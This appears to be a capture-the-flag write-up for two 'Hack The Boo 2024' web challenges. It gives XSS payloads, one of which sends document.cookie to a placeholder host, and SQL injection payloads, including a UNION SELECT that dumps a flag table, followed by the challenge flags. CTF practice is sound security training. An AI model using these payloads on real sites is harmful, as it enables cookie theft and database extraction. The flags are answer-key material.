# Hack The Boo 2024 Write-Up

## WEB

### Phantom's Script

![image](https://github.com/user-attachments/assets/1d5b113b-039a-46ba-8470-0c8688fd03c4)

Basic XSS Payload:

`<script>alert('Boo!');</script>`

`<script>fetch('[host]')</script>`

More Diabolical Payload:

`<img src=x onerror="alert('Boo!')">`

`<img src=x onerror="fetch('[HOST]' + document.cookie)" />`

Use XSS payload `<script>fetch('[host]')</script>`

![image](https://github.com/user-attachments/assets/3bd034b8-1f32-4c04-9ebe-b96564676f02)

FLAG:

    HTB{xSS-1S_E4SY_wh4t_d0_y0u_th1nk?_5bae9bc761ca417e235b3b735ad26e1d}

### Unholy Union

![image](https://github.com/user-attachments/assets/65afbf7a-4d21-431c-98af-08696dc38732)

    ' OR '1'='1

![image](https://github.com/user-attachments/assets/8cd95fa3-2dc9-42a9-ae86-766d1c988a39)

Payload:

    A' UNION SELECT NULL, NULL, NULL, NULL, (SELECT GROUP_CONCAT(flag) FROM flag) -- -

FLAG:

    HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_5fa4eea67494d90a2d2ce205e7dbd1dd}
